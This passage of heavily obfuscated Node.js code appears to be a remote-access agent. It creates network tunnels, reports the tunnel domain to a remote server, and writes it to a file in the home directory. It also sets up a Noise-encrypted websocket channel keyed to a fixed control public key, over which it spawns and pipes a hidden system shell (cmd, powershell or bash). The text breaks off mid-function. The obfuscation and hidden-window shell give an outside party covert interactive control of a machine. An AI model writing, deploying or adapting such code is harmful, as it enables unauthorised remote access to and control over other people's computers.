            const m = f[k0(0x94e)](k, null) && k[k0(0x698)] || f[k0(0x67b)](l, null) && l[k0(0x698)];
            if (m) {
                const t = f[k0(0xb08)][k0(0xb0c)]('|');
                let u = 0x0;
                while (!![]) {
                    switch (t[u++]) {
                    case '0':
                        a[k0(0x89d)] = f['gkCYy'](a0c6);
                        continue;
                    case '1':
                        a['lastError'] = null;
                        continue;
                    case '2':
                        a[k0(0x2fd)] = null;
                        continue;
                    case '3':
                        a['quicFailures'] = 0x0;
                        continue;
                    case '4':
                        a[k0(0x539)] = 0x0;
                        continue;
                    case '5':
                        a[k0(0xaa2)] = f['rjWLs'];
                        continue;
                    }
                    break;
                }
            } else {
                a[k0(0x539)] += 0x1;
                if (f['rMGEQ'](a[k0(0xaa2)], f[k0(0x17a)]))
                    a['status'] = k0(0xb65);
                a[k0(0xcf7)] === f[k0(0x75e)] && (a[k0(0xb31)] += 0x1, f[k0(0xc48)](a[k0(0xb31)], a0c0) && (a['transport'] = 'h2', this['log']['warning'](k0(0x4f8) + a[k0(0x4a6)] + k0(0x30b) + a[k0(0xb31)] + k0(0x418)), a['quicFailures'] = 0x0));
                if (f[k0(0xc48)](a[k0(0x539)], a0c0)) {
                    if (await this[k0(0x5ff)](a, (v, w, x) => {
                            b = v, c = w, d = x;
                        })) {
                        const v = f[k0(0xc27)][k0(0xb0c)]('|');
                        let w = 0x0;
                        while (!![]) {
                            switch (v[w++]) {
                            case '0':
                                a[k0(0x2fd)] = null;
                                continue;
                            case '1':
                                a[k0(0xaa2)] = f['rjWLs'];
                                continue;
                            case '2':
                                a['lastRegisteredAt'] = f['gkCYy'](a0c6);
                                continue;
                            case '3':
                                a[k0(0x8ff)] = null;
                                continue;
                            case '4':
                                a[k0(0xb31)] = 0x0;
                                continue;
                            case '5':
                                a[k0(0x539)] = 0x0;
                                continue;
                            }
                            break;
                        }
                    } else
                        f[k0(0x67b)](a['status'], f['JOmkE']) && (a[k0(0xaa2)] = k0(0x3c8), a[k0(0x8ff)] == null && (a[k0(0x8ff)] = f['XLfwY'], a[k0(0x2fd)] = a0c6())), await f[k0(0x799)](h, f[k0(0x6b5)](f['XSUku'](a0c4, a[k0(0x539)]), 0x3e8));
                }
            }
            !a[k0(0x691)] && await f[k0(0xc85)](h, f['eWYIH'](f['LvsqK'](a['consecutiveFailures'], 0x0) ? f[k0(0xbdd)](a0c4, a[k0(0x539)]) : a0bY, 0x3e8));
        }
    }
    [a0cm(0x5ff)](a, b) {
        const k2 = a0cm, c = {
                'KQmwp': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'gcPWI': 'https://',
                'iXkiN': function (f, g) {
                    return f + g;
                },
                'PyurV': function (f, g) {
                    return f + g;
                },
                'SumgB': k2(0x69d),
                'SHAgJ': function (f, g) {
                    return f === g;
                },
                'hTSxC': k2(0x13e),
                'Nnfth': function (f, g) {
                    return f + g;
                },
                'CSHUD': k2(0xd9d),
                'fyMvY': function (f, g) {
                    return f(g);
                }
            }, d = this[k2(0x852)] || a0aQ;
        return c[k2(0x393)](d, k2(0x279))[k2(0x896)](([f, g, h, i]) => {
            const k3 = k2, j = a['tunnelDomain'];
            c['KQmwp'](b, g, h, i), a[k3(0x4a6)] = f[k3(0x830)](c[k3(0x481)]) ? f : c[k3(0x183)](k3(0x201), f), this[k3(0x305)]['warning'](c[k3(0xc53)](c[k3(0xc53)](c['iXkiN'](c['SumgB'], j), k3(0x50b)), a[k3(0x4a6)]));
            if (c[k3(0x3c0)](typeof this[k3(0x15a)], c[k3(0x49b)]))
                try {
                    this[k3(0x15a)](j, a[k3(0x4a6)]);
                } catch (k) {
                }
            return !![];
        })[k2(0xd7b)](f => {
            const k4 = k2;
            return this['log'][k4(0x756)](c[k4(0xa6e)](c[k4(0x94f)], f[k4(0xbe8)])), ![];
        });
    }
}
class a0ca {
    static [a0cm(0x6c8)] = ![];
    static [a0cm(0x557)] = null;
    static [a0cm(0xb3d)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static ['_SHZAL_KEY_HINT_SHOWN'] = ![];
    static ['knameValid']() {
        const k5 = a0cm, a = {
                'kfXGO': k5(0xce8),
                'jjjLb': function (g, h) {
                    return g < h;
                },
                'WZcHE': 'KNAME_KEY',
                'ezzkF': function (g, h) {
                    return g === h;
                },
                'yCwRk': function (g, h) {
                    return g || h;
                },
                'EYmtD': k5(0xae9),
                'xSxWo': k5(0x828),
                'QNIEr': k5(0x4c6)
            }, b = a0a1[k5(0x583)] || '', c = a0a1[k5(0x62f)] || a0a1[k5(0x583)] || '', d = [];
        if (b[k5(0x55c)] < 0x3)
            d[k5(0x1d5)](k5(0xdba) + b[k5(0x55c)] + k5(0xac6));
        if (!this[k5(0xb3d)]['test'](b))
            d['push'](a[k5(0xb4c)]);
        if (a[k5(0xb28)](c[k5(0x55c)], 0x8))
            d[k5(0x1d5)](k5(0x7b7) + c[k5(0x55c)] + k5(0x434) + (a0a1['KNAME_KEY'] ? a['WZcHE'] : 'KNAME') + ')');
        const f = a[k5(0x7db)](d[k5(0x55c)], 0x0);
        return !f && !this[k5(0xb83)] && (this['_SHZAL_KEY_HINT_SHOWN'] = !![], a0P[k5(0xd42)](k5(0x2ee) + d[k5(0x455)](';\x20') + '\x20' + (k5(0x2a3) + a[k5(0x132)](b, a[k5(0x88b)]) + k5(0x5a8) + (a0a1[k5(0x62f)] ? k5(0x2c6) + a0a1['KNAME_KEY'][k5(0x55c)] + ')' : a[k5(0xca2)]) + ')')), a0P[k5(0xd42)](a[k5(0x65e)])), f;
    }
    static [a0cm(0x77b)]() {
        const k6 = a0cm, a = {
                'colCU': function (b, c) {
                    return b === c;
                },
                'MgmLB': function (b, c) {
                    return b(c);
                },
                'UvIeI': k6(0x9ac)
            };
        return a0a1['DEBUG'] || a['colCU'](a[k6(0x61d)](String, process.env.SHZAL_DEBUG || '')[k6(0x426)](), a['UvIeI']);
    }
    static [a0cm(0x8e4)](a) {
        const k7 = a0cm, b = {
                'oGDLQ': function (f, g) {
                    return f + g;
                },
                'cgHYf': k7(0x372),
                'ZpyUc': k7(0x536),
                'TJjDE': function (f, g) {
                    return f(g);
                },
                'CjwoW': k7(0x64c),
                'hZAKl': k7(0x76d),
                'RvhNS': function (f, g) {
                    return f === g;
                },
                'oHPOh': k7(0xa75),
                'LicXP': k7(0x7f1),
                'yLmOk': k7(0x2eb),
                'OQrMl': '上报成功',
                'EDIeG': function (f, g) {
                    return f + g;
                },
                'xkfJl': function (f, g) {
                    return f + g;
                },
                'kwOiH': function (f, g) {
                    return f + g;
                },
                'dGPUa': '开始上报域名\x20->\x20',
                'ZHbSo': function (f, g) {
                    return f > g;
                },
                'hsHDJ': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'itVva': k7(0x964),
                'KxYLe': k7(0xd69)
            }, c = this[k7(0x77b)](), d = f => {
                const k8 = k7;
                if (c)
                    a0P['debug'](b[k8(0x822)](b[k8(0xa59)], f));
            };
        return new Promise(f => {
            const k9 = k7, g = {
                    'gPcQw': b[k9(0xc60)],
                    'bsnSb': function (n, o) {
                        const ka = k9;
                        return b[ka(0x324)](n, o);
                    },
                    'jHrGK': function (n, o) {
                        return b['oGDLQ'](n, o);
                    },
                    'OpGyF': b[k9(0x7af)],
                    'QswaX': function (n, o) {
                        return n(o);
                    },
                    'XGWoB': b['hZAKl'],
                    'SWbad': k9(0xaa0),
                    'ggPGz': function (n, o) {
                        return b['RvhNS'](n, o);
                    },
                    'BLCzW': b[k9(0x899)],
                    'cMFmX': b[k9(0xb89)],
                    'oONRx': function (n, o) {
                        return b['oGDLQ'](n, o);
                    },
                    'FmBdN': b[k9(0xa98)],
                    'OExYR': function (n, o, p, q, r) {
                        return n(o, p, q, r);
                    },
                    'KPiSN': b[k9(0x9b5)],
                    'MGQNv': function (n, o) {
                        return b['TJjDE'](n, o);
                    },
                    'KcGHI': function (n, o) {
                        const kb = k9;
                        return b[kb(0x822)](n, o);
                    },
                    'hxLCG': function (n, o) {
                        return n + o;
                    }
                }, h = a0a1[k9(0x583)], i = a0a1[k9(0x62f)] || a0a1[k9(0x583)], j = b[k9(0x378)](k9(0x6a6), a0k[k9(0x395)](0xc)[k9(0x7a0)](k9(0x47c))), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const kc = k9, o = n[kc(0x8a0)](([p, q]) => Buffer[kc(0x1e7)]('--' + j + kc(0x1a6) + p + kc(0x34b) + q + '\x0d\x0a'));
                    return o[kc(0x1d5)](Buffer[kc(0x1e7)]('--' + j + kc(0x3cb))), Buffer[kc(0x5f9)](o);
                }, m = (n, o, p, q) => {
                    const kd = k9, r = {
                            'nDJVT': g[kd(0x11c)],
                            'yCnuH': function (v, w) {
                                const ke = kd;
                                return g[ke(0xab4)](v, w);
                            },
                            'OVWnE': function (v, w) {
                                const kf = kd;
                                return g[kf(0x11f)](v, w);
                            },
                            'yVvRY': function (v, w) {
                                return v + w;
                            },
                            'iPbGU': g[kd(0xba5)],
                            'FSCud': function (v, w) {
                                const kg = kd;
                                return g[kg(0x196)](v, w);
                            }
                        }, s = new URL(n), t = a0h[kd(0x16e)]({
                            'hostname': s[kd(0xc18)],
                            'port': s[kd(0x597)] || 0x1bb,
                            'path': s['pathname'] + s[kd(0x91f)],
                            'method': p,
                            'headers': {
                                'Content-Type': kd(0xf9) + j,
                                'Content-Length': o ? o[kd(0x55c)] : 0x0,
                                'User-Agent': g[kd(0x52e)]
                            }
                        }, v => {
                            const kh = kd;
                            v[kh(0x1cf)](), v['on'](r[kh(0xda2)], () => q(v[kh(0x16d)]));
                        });
                    t['on'](g[kd(0xa4f)], v => {
                        const ki = kd;
                        r['yCnuH'](d, r[ki(0xa6c)](r['OVWnE'](r[ki(0x3af)](p + '\x20', n), r[ki(0x1b9)]), v['message'])), r['FSCud'](q, 0x0);
                    }), t[kd(0x1a4)](0x7530, () => t['destroy'](new Error(kd(0x865))));
                    if (o)
                        t[kd(0x10b)](o);
                    t[kd(0x536)]();
                };
            b[k9(0x324)](d, b[k9(0x65d)](b[k9(0xd70)](b[k9(0xd70)](b[k9(0xd46)], h) + k9(0xacd), b[k9(0x6b1)](i[k9(0x55c)], 0x0)), ')'));
            try {
                b[k9(0xbea)](m, b[k9(0x80b)], b[k9(0x324)](l, k), b['KxYLe'], n => {
                    const kk = k9, o = {
                            'otTdm': function (p, q) {
                                return p + q;
                            },
                            'SyXwr': function (p, q) {
                                const kj = a0b;
                                return g[kj(0xd58)](p, q);
                            },
                            'FWUNB': g[kk(0xb67)],
                            'MmcgF': function (p, q) {
                                return p(q);
                            }
                        };
                    g[kk(0xab4)](d, g[kk(0x11f)](g['cMFmX'], n));
                    if (g[kk(0xd58)](n, 0x199)) {
                        d(g['oONRx'](g['FmBdN'], h) + ':*');
                        const p = k[kk(0x88f)](([q]) => q !== 'n');
                        g[kk(0x9f3)](m, kk(0xad0) + h + ':' + i, g[kk(0xab4)](l, p), kk(0x9f6), q => {
                            const kl = kk;
                            d(o['otTdm'](o['otTdm'](kl(0x93d), q), o[kl(0x577)](q, 0xc8) ? kl(0x639) : o[kl(0x60f)])), o[kl(0x2b2)](f, o[kl(0x577)](q, 0xc8));
                        });
                    } else
                        n === 0xc8 ? (g[kk(0xab4)](d, g[kk(0x345)]), g[kk(0xbbb)](f, !![])) : (d(g['KcGHI'](g[kk(0x9da)]('上报失败\x20(状态\x20', n), ')')), g['MGQNv'](f, ![]));
                });
            } catch (n) {
                d('上报异常:\x20' + n['message']), b[k9(0x324)](f, ![]);
            }
        })[k7(0x896)](f => {
            const km = k7;
            if (f)
                this[km(0x557)] = a;
            return f;
        })[k7(0xd7b)](() => ![]);
    }
    static async [a0cm(0x7cf)](a) {
        const kn = a0cm, b = {
                'jWjeM': function (c, d) {
                    return c <= d;
                }
            };
        for (let c = 0x1; b[kn(0x7ca)](c, 0x3); c++) {
            if (await this[kn(0x8e4)](a))
                return;
            c < 0x3 && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0cm(0x76f)]() {
        const ko = a0cm, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[ko(0xc25)](b) && a0l['statSync'](b)['isDirectory']())
                return b;
        }
        try {
            return a0p[ko(0xa93)]();
        } catch (c) {
            return process[ko(0x733)]();
        }
    }
    static ['resolveDomainFilePath']() {
        const kp = a0cm, a = {
                'hoopB': kp(0x885),
                'mGFWl': kp(0x929)
            };
        let b = (a0a1['KPATH'] || '')[kp(0x58a)]();
        if (!b)
            return a0o[kp(0x455)](this[kp(0x76f)](), a[kp(0xa7f)]);
        if (b[kp(0x830)](a[kp(0x1ce)]))
            b = b['length'] > 0x5 ? a0o['join'](this[kp(0x76f)](), b[kp(0x2d5)](0x5)[kp(0x3a0)](/^[/\\]+/, '')) : this[kp(0x76f)]();
        else
            b[kp(0x830)]('~') && (b = a0o[kp(0x48d)](b[kp(0x3a0)](/^~(?=[/\\]|$)/, this['homeDir']())));
        return b;
    }
    static [a0cm(0x4a5)](a) {
        const kq = a0cm;
        this[kq(0x557)] = a;
        const b = this[kq(0x59f)]();
        try {
            a0l[kq(0x8a8)](a0o[kq(0xbfd)](a0o[kq(0x48d)](b)), { 'recursive': !![] }), a0l[kq(0x660)](b, a), a0P['info'](kq(0xb0b) + b);
        } catch (c) {
            a0P[kq(0x6df)](kq(0xbd0) + b + '):\x20' + c[kq(0xbe8)]);
        }
    }
    static [a0cm(0x29b)]() {
        const kr = a0cm, a = this[kr(0x59f)]();
        try {
            a0l[kr(0xc25)](a) && a0l[kr(0xc6d)](a)[kr(0x349)]() && (a0l[kr(0x198)](a), a0P[kr(0xd42)](kr(0x7de) + a));
        } catch (b) {
            a0P[kr(0x6df)]('[KMODE]\x20⚠️\x20域名文件删除失败\x20(' + a + kr(0x37b) + b[kr(0xbe8)]);
        }
    }
    static [a0cm(0x760)]() {
        const ks = a0cm;
        !this[ks(0x6c8)] && (this[ks(0x6c8)] = !![], this['deleteDomainFile']());
    }
    static [a0cm(0x5a2)]() {
        const kt = a0cm, a = {
                'QmcIc': function (b, c) {
                    return b === c;
                },
                'OgFQa': kt(0x1db),
                'lGPii': kt(0x81e),
                'xbFYs': kt(0x490),
                'fddnw': kt(0x7bc)
            };
        try {
            const b = a0q[kt(0xca7)]({
                'input': process[kt(0x506)],
                'terminal': ![]
            });
            b['on'](a[kt(0x182)], c => {
                const ku = kt;
                a['QmcIc'](c[ku(0x58a)](), a['OgFQa']) && console[ku(0x305)](this[ku(0x557)] || a[ku(0x656)]);
            }), b['on'](a[kt(0xc8d)], () => {
            }), b['on'](kt(0xaa0), () => {
            });
        } catch (c) {
        }
    }
    static [a0cm(0x119)](a) {
        const kv = a0cm, b = {
                'vsoeg': function (c, d) {
                    return c === d;
                },
                'PfwrT': function (c, d) {
                    return c + d;
                },
                'qWZsu': '[KMODE]\x20🚀\x20KMODE=2',
                'nIVoA': kv(0x5e1),
                'pCGha': kv(0x73f),
                'IlISx': '[KMODE]\x20🚀\x20KMODE=1:\x20启动时自动创建临时隧道'
            };
        if (b[kv(0xa9d)](a0a1['KMODE'], '2') && this[kv(0xb82)]()) {
            const c = b['vsoeg'](a0a1['KMODE_QUIC'], !![]);
            a0P[kv(0xd42)](b['PfwrT'](b[kv(0x9ba)], c ? 'q' : '') + b[kv(0xb78)] + (c ? b[kv(0x9a4)] : '')), a['onDomainChange'] = (d, f) => {
                const kw = kv;
                this[kw(0x7cf)](f);
            }, a[kv(0x74a)](a0a1[kv(0x759)], ![], c)[kv(0x896)](d => this[kv(0x8e4)](d['tunnelDomain']))[kv(0xd7b)](() => {
            });
            return;
        }
        a0P[kv(0xd42)](b[kv(0x9e8)]), a['onDomainChange'] = (d, f) => {
            const kx = kv;
            this[kx(0x4a5)](f);
        }, a[kv(0x74a)](a0a1[kv(0x759)])[kv(0x896)](d => {
            const ky = kv;
            this[ky(0x4a5)](d[ky(0x4a6)]);
        })['catch'](d => {
            const kz = kv;
            a0P['warn']('[KMODE]\x20⚠️\x20启动隧道创建失败:\x20' + d[kz(0xbe8)]);
        }), this[kv(0x5a2)]();
    }
}
let a0cb = null, a0cc = null;
const a0cd = new Promise((a, b) => {
    const kA = a0cm, c = {
            'yJLbo': kA(0x724),
            'DmsUk': kA(0x3f9),
            'hGXqY': function (d) {
                return d();
            },
            'NsCzp': kA(0x937),
            'UFlWL': function (d, f) {
                return d(f);
            },
            'ZNcnd': kA(0x94d)
        };
    try {
        c['UFlWL'](a0y, function (d) {
            const kB = kA;
            if (!d) {
                a0cc = new Error(c[kB(0x3b2)]), a0P['warn'](c[kB(0x480)], a0cc[kB(0xbe8)]), c['hGXqY'](a);
                return;
            }
            a0cb = d, a0P[kB(0x3a5)](c[kB(0x33a)]), a();
        });
    } catch (d) {
        a0cc = d, a0P[kA(0x6df)](c['ZNcnd'], d['message']), c['hGXqY'](a);
    }
});
process['on']('unhandledRejection', (a, b) => {
    const kC = a0cm, c = { 'NzzUm': 'Unhandled\x20Promise\x20Rejection:' };
    a0P['error'](c[kC(0x295)], a);
}), process['on'](a0cm(0x371), a => {
    const kD = a0cm, b = { 'LJSpc': kD(0xd72) };
    a0P[kD(0xaa0)](b[kD(0x175)], a), process['exit'](0x1);
});
class a0ce {
    constructor(a, b, c) {
        const kE = a0cm, d = kE(0x7b5)[kE(0xb0c)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this['handshakeFinished'] = ![];
                continue;
            case '1':
                this['sendCipher'] = null;
                continue;
            case '2':
                this['localPrivB64'] = b;
                continue;
            case '3':
                this[kE(0x318)] = a;
                continue;
            case '4':
                this[kE(0xaa7)] = null;
                continue;
            case '5':
                this['hs'] = null;
                continue;
            case '6':
                this[kE(0xb97)] = c;
                continue;
            }
            break;
        }
    }
    async [a0cm(0x776)]() {
        const kF = a0cm, a = {
                'Sulel': kF(0x2e4),
                'ZwMVF': 'kisama_terminal_v1',
                'lsnYX': kF(0x5bd)
            };
        await a0cd;
        if (!a0cb)
            throw a0cc || new Error(a[kF(0xa55)]);
        const b = a0cb, c = this['isInitiator'] ? b[kF(0x680)]['NOISE_ROLE_INITIATOR'] : b[kF(0x680)][kF(0x171)];
        this['hs'] = b[kF(0xc9a)](kF(0x71a), c);
        const d = Buffer[kF(0x1e7)](a['ZwMVF']), f = this[kF(0x595)] ? Buffer[kF(0x1e7)](this[kF(0x595)], a['lsnYX']) : null, g = this[kF(0xb97)] ? Buffer['from'](this[kF(0xb97)], a[kF(0xa62)]) : null;
        this['hs'][kF(0x83b)](d, f, g, null);
    }
    [a0cm(0x9cd)](a) {
        const kG = a0cm, b = {
                'lGcTI': function (d, f) {
                    return d > f;
                },
                'FZISD': function (d, f) {
                    return d === f;
                },
                'zMtra': function (d, f) {
                    return d === f;
                }
            };
        if (this[kG(0x63d)])
            return Buffer[kG(0x2d9)](0x0);
        const c = a0cb;
        a && b[kG(0x385)](a[kG(0x55c)], 0x0) && b[kG(0x9a8)](this['hs'][kG(0x93a)](), c['constants']['NOISE_ACTION_READ_MESSAGE']) && this['hs']['ReadMessage'](a);
        if (b[kG(0x410)](this['hs'][kG(0x93a)](), c[kG(0x680)][kG(0x7e0)]))
            return this[kG(0x51d)](), Buffer['alloc'](0x0);
        if (this['hs'][kG(0x93a)]() === c[kG(0x680)][kG(0x954)]) {
            const d = this['hs'][kG(0xae5)](new Uint8Array(0x0));
            return this['hs'][kG(0x93a)]() === c['constants'][kG(0x7e0)] && this['_splitAndFinish'](), Buffer['from'](d);
        }
        return Buffer[kG(0x2d9)](0x0);
    }
    ['_splitAndFinish']() {
        const kH = a0cm, a = {
                'PvTec': kH(0x5bd),
                'lCpan': function (g, h) {
                    return g === h;
                },
                'HgAOE': kH(0x2d7)
            };
        let b = null;
        try {
            b = this['hs']['GetRemotePublicKey']();
        } catch (g) {
            b = null;
        }
        const c = this[kH(0xb97)] ? Buffer[kH(0x1e7)](this['expectedRemotePubB64'], a['PvTec']) : null, d = b && c && a['lCpan'](b['length'], c[kH(0x55c)]) && a0k['timingSafeEqual'](Buffer[kH(0x1e7)](b), c);
        if (!d)
            throw new Error(a[kH(0xbfc)]);
        const f = this['hs'][kH(0x390)]();
        this['sendCipher'] = f[0x0], this[kH(0xaa7)] = f[0x1], this[kH(0x63d)] = !![];
        try {
            if (this['hs'])
                this['hs'][kH(0x219)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0cm(0x28a)](a) {
        const kI = a0cm;
        if (!this[kI(0x63d)])
            throw new Error(kI(0x1c1));
        const b = new Uint8Array(0x0), c = new Uint8Array(a);
        return Buffer['from'](this[kI(0x609)][kI(0xb5d)](b, c));
    }
    [a0cm(0x18a)](a) {
        const kJ = a0cm, b = { 'yAqFQ': '握手未完成，无法解密数据' };
        if (!this[kJ(0x63d)])
            throw new Error(b['yAqFQ']);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[kJ(0x1e7)](this[kJ(0xaa7)][kJ(0x675)](c, d));
    }
    [a0cm(0x219)]() {
        const kK = a0cm, a = { 'rVjeU': kK(0xc7b) }, b = a['rVjeU'][kK(0xb0c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['hs'] = null;
                continue;
            case '1':
                try {
                    if (this['sendCipher'])
                        this[kK(0x609)]['free']();
                } catch (d) {
                }
                continue;
            case '2':
                try {
                    if (this['hs'])
                        this['hs'][kK(0x219)]();
                } catch (f) {
                }
                continue;
            case '3':
                this[kK(0x609)] = null;
                continue;
            case '4':
                this[kK(0xaa7)] = null;
                continue;
            case '5':
                try {
                    if (this[kK(0xaa7)])
                        this[kK(0xaa7)][kK(0x219)]();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0cf {
    constructor(a, b, c, d) {
        const kL = a0cm;
        this[kL(0x5d2)] = a, this[kL(0x336)] = b, this[kL(0x733)] = c, this[kL(0x838)] = d || [], this[kL(0x566)] = null, this[kL(0xc8b)] = 0x0, this[kL(0xc0d)] = null, this['_onExitCb'] = null;
    }
    [a0cm(0x942)]() {
        const kM = a0cm, a = {
                'DYXdC': function (c, d) {
                    return c || d;
                },
                'sHagY': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'VBZwr': kM(0x15b),
                'uAGzo': kM(0x5f8),
                'tmUsj': kM(0x744)
            };
        this['proc'] = a['sHagY'](a0s, this[kM(0x5d2)], this[kM(0x838)], {
            'env': this[kM(0x336)],
            'cwd': this[kM(0x733)],
            'windowsHide': !![],
            'stdio': [
                a[kM(0x928)],
                kM(0x15b),
                a['VBZwr']
            ]
        }), this[kM(0xc8b)] = this[kM(0x566)][kM(0xc8b)] || 0x0;
        const b = this;
        this[kM(0x566)][kM(0x288)]['on'](a['uAGzo'], c => b['_emitData'](c)), this[kM(0x566)]['stderr']['on'](kM(0x5f8), c => b[kM(0x237)](c)), this[kM(0x566)]['on'](a['tmUsj'], (c, d) => {
            const kN = kM;
            if (b['_onExitCb'])
                b[kN(0x603)]({
                    'exitCode': c,
                    'signal': a['DYXdC'](d, null)
                });
        });
    }
    [a0cm(0x237)](a) {
        const kO = a0cm;
        if (this['_onDataCb'])
            this['_onDataCb'](a[kO(0x7a0)]('utf-8'));
    }
    [a0cm(0x449)](a) {
        return this['_onDataCb'] = a, {
            'dispose': () => {
                const kP = a0b;
                this[kP(0xc0d)] = null;
            }
        };
    }
    [a0cm(0x72f)](a) {
        const kQ = a0cm;
        return this[kQ(0x603)] = a, {
            'dispose': () => {
                const kR = kQ;
                this[kR(0x603)] = null;
            }
        };
    }
    [a0cm(0x10b)](a) {
        const kS = a0cm;
        if (!this[kS(0x566)] || !this[kS(0x566)][kS(0x506)])
            return;
        try {
            this[kS(0x566)][kS(0x506)][kS(0x10b)](a);
        } catch (b) {
        }
    }
    [a0cm(0x17d)]() {
    }
    [a0cm(0x713)]() {
        const kT = a0cm;
        try {
            if (this[kT(0x566)])
                this[kT(0x566)]['kill']();
        } catch (a) {
        }
    }
}
class a0cg {
    constructor() {
        const kU = a0cm, a = {
                'HrpSS': kU(0x9d2),
                'OMaHj': kU(0xa04)
            }, b = a[kU(0xd29)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[kU(0xa39)] = a0a1[kU(0x619)][kU(0x10f)][kU(0xc4c)];
                continue;
            case '1':
                this[kU(0xc74)] = [];
                continue;
            case '2':
                this['AGENT_PRIVATE_KEY'] = a0a1[kU(0x619)][kU(0x4df)][kU(0x50c)];
                continue;
            case '3':
                this[kU(0xb60)] = null;
                continue;
            case '4':
                this[kU(0x32d)] = new a0ce(![], this['AGENT_PRIVATE_KEY'], this['CONTROL_PUBLIC_KEY']);
                continue;
            case '5':
                this[kU(0x6e8)] = ![];
                continue;
            case '6':
                this[kU(0x6d1)] = [];
                continue;
            case '7':
                this['metaRequested'] = ![];
                continue;
            case '8':
                this[kU(0x989)] = a[kU(0xa97)];
                continue;
            case '9':
                this[kU(0x388)] = null;
                continue;
            case '10':
                this[kU(0x51f)] = null;
                continue;
            case '11':
                this['useNoise'] = !![];
                continue;
            }
            break;
        }
    }
    async ['cleanup']() {
        const kV = a0cm, a = {
                'mwPVP': function (b, c) {
                    return b === c;
                },
                'NjEyG': 'win32',
                'Ipjnb': function (b, c) {
                    return b === c;
                },
                'EGxFY': kV(0x25d)
            };
        this['requestId'] && a0P[kV(0xd42)]('[' + this['requestId'] + ']\x20执行终端资源清理...');
        if (this[kV(0x388)]) {
            a[kV(0x895)](process[kV(0x267)], a['NjEyG']) && this[kV(0x388)]['pid'] && this[kV(0x23a)](this[kV(0x388)][kV(0xc8b)]);
            try {
                this['ptyProcess'][kV(0x713)]();
            } catch (b) {
            }
            this['ptyProcess'] = null;
        }
        if (this['cipher'])
            this[kV(0x32d)][kV(0x219)]();
        if (this[kV(0x51f)])
            try {
                a['Ipjnb'](this[kV(0x51f)][kV(0x127)], this[kV(0x51f)][kV(0xc56)]) && this[kV(0x51f)]['close'](0x3e8, a[kV(0x8f3)]);
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0cm(0x23a)](a) {
        const kW = a0cm;
        try {
            a0r(kW(0xc77) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (b) {
        }
    }
    [a0cm(0xc4b)](a) {
        const kX = a0cm, b = {
                'hGgDR': function (c, d) {
                    return c === d;
                },
                'Asnso': function (c, d) {
                    return c(d);
                },
                'lrcZH': kX(0x245)
            };
        if (b[kX(0xa96)](this[kX(0x989)], 'handshake')) {
            if (this['msgResolvers'][kX(0x55c)] > 0x0) {
                const c = this[kX(0xc74)][kX(0x3b0)]();
                b[kX(0x2e1)](c, a);
            } else
                this[kX(0x6d1)][kX(0x1d5)](a);
        } else
            b[kX(0xa96)](this['phase'], b[kX(0x763)]) && this[kX(0x1a2)](a);
    }
    async [a0cm(0x217)]() {
        const kY = a0cm, a = {
                'JsCLx': function (b, c) {
                    return b > c;
                }
            };
        if (a[kY(0x70e)](this['msgQueue']['length'], 0x0))
            return this[kY(0x6d1)][kY(0x3b0)]();
        return new Promise(b => {
            this['msgResolvers']['push'](b);
        });
    }
    async ['_doNoiseHandshake'](a) {
        const kZ = a0cm, b = {
                'MLzrQ': function (c, d) {
                    return c(d);
                },
                'gUkmd': kZ(0x59a),
                'dSWiG': function (c, d) {
                    return c > d;
                },
                'uRLjo': kZ(0x2c1),
                'lWIhR': '✅\x20Noise\x20握手完成，端到端加密通道已建立！',
                'oHeOO': function (c, d) {
                    return c(d);
                }
            };
        b['MLzrQ'](a, b[kZ(0xff)]);
        try {
            await this[kZ(0x32d)][kZ(0x776)]();
            const c = await this[kZ(0x217)](), d = this['cipher'][kZ(0x9cd)](c);
            d && b[kZ(0x97e)](d[kZ(0x55c)], 0x0) && this[kZ(0x51f)][kZ(0x77d)](d);
            const f = await this[kZ(0x217)]();
            this[kZ(0x32d)][kZ(0x9cd)](f);
            if (!this['cipher'][kZ(0x63d)])
                throw new Error(b[kZ(0x6e9)]);
            a(b[kZ(0x16a)]);
        } catch (g) {
            b['oHeOO'](a, kZ(0x499) + g['message']);
            throw new Error(kZ(0xb34));
        }
    }
    [a0cm(0x5dd)]() {
        const l0 = a0cm, a = {
                'iSJQc': function (d, f) {
                    return d === f;
                },
                'oKrdZ': l0(0x9be),
                'YtYlN': l0(0xdaf),
                'Kzupz': l0(0x54d),
                'GNjbU': 'v1.0',
                'jJzSp': l0(0xd1d),
                'PARcQ': '/bin/bash',
                'ejeLN': l0(0x7ba),
                'RTjzk': '/bin/ash',
                'QhCvZ': l0(0xb57)
            };
        if (a[l0(0x4cf)](process[l0(0x267)], l0(0x269))) {
            const d = process.env.SystemRoot || a['oKrdZ'], f = [
                    a0o['join'](d, a['YtYlN'], a[l0(0xd01)], a[l0(0x181)], l0(0xc97)),
                    process.env.COMSPEC,
                    a0o[l0(0x455)](d, a[l0(0x3d6)], a[l0(0xa3f)])
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return a[l0(0xa3f)];
        }
        const b = [
            a[l0(0xccf)],
            a[l0(0x538)],
            a['RTjzk']
        ];
        for (const h of b) {
            if (a0l[l0(0xc25)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[l0(0xc25)](c))
            return c;
        return a[l0(0x1d4)];
    }
    async ['startSession'](a, b, c, d = ![], f = ![]) {
        const l1 = a0cm, g = {
                'rEtQW': function (i, j) {
                    return i(j);
                },
                'GzwKx': l1(0xa6f)
            };
